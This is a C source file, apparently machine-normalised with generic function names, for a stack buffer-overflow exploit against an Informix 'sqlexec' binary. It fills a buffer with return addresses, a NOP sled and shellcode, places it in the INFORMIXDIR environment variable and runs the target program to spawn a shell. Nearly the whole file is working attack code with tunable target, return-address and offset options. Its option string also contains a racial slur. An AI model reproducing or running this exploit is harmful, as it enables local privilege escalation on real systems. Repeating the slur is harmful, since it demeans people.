#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int retadd; int offset; } ;

/* Variables and functions */
 int BUFFERSIZE ; 
 int EOF ; 
 void* FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int FUNC3 (int,char**,char*) ; 
 int /*<<< orphan*/ * lunixshell ; 
 char* FUNC4 (int) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC5 (char*,...) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*,int) ; 
 int FUNC7 (int /*<<< orphan*/ *) ; 
 int FUNC8 (int /*<<< orphan*/ ,int /*<<< orphan*/ *,int) ; 
 TYPE_1__* targets ; 
 size_t type ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 

int FUNC10(int argc, char *argv[])
{
	int i, c, os;
	long *addr_ptr;
	char *buffer, *ptr, *osptr;

	
	/* offset = atoi(argv[1]);  */
 	/* esp    = retadd; */
      /* ret    = esp-offset; */


     if(argc < 3)
       {
         FUNC9(argv[0]);
         return 1;
       }

      while(( c = FUNC3 (argc, argv, "t:r:o:nigger"))!= EOF){

      switch (c)
        {

         case 't':
            type = FUNC0(optarg);
            break;
 
         case 'r':
            targets[type].retadd = FUNC8(optarg, NULL, 16);
            break;

         case 'o':
            targets[type].offset = FUNC0(optarg);
            break;

        default:
          FUNC9(argv[0]);
          return 1;
        }
   }


	FUNC5("[<>] - Stack pointer: 0x%x\n", targets[type].retadd);
	FUNC5("[<>] - Offset: 0x%x\n", targets[type].offset);
	FUNC5("[<>] - Return addr: 0x%x\n", targets[type].retadd - targets[type].offset);


	/* allocate memory for our buffer */
	if(!(buffer = FUNC4(BUFFERSIZE))) {
		FUNC5("Couldn't allocate memory.\n");
		FUNC2(-1);
	}

	/* fill buffer with ret addr's */
	ptr = buffer;
	addr_ptr = (long *)ptr;
	for(i=0; i<BUFFERSIZE; i+=4)
		*(addr_ptr++) = targets[type].retadd - targets[type].offset;

	/* fill first half of buffer with NOPs */
	for(i=0; i<BUFFERSIZE/2; i++)
		buffer[i] = '\x90';

	/* insert shellcode in the middle */
	ptr = buffer + ((BUFFERSIZE/2) - (FUNC7(lunixshell)/2));
	for(i=0; i<FUNC7(lunixshell); i++)
		*(ptr++) = lunixshell[i];


	/* call the vulnerable program passing our exploit buffer as the argument */

	buffer[BUFFERSIZE-1] = 0;
      FUNC6("INFORMIXDIR", buffer, 1);
	FUNC1("./sqlexec", "sqlexec", NULL); 
	return 0;
}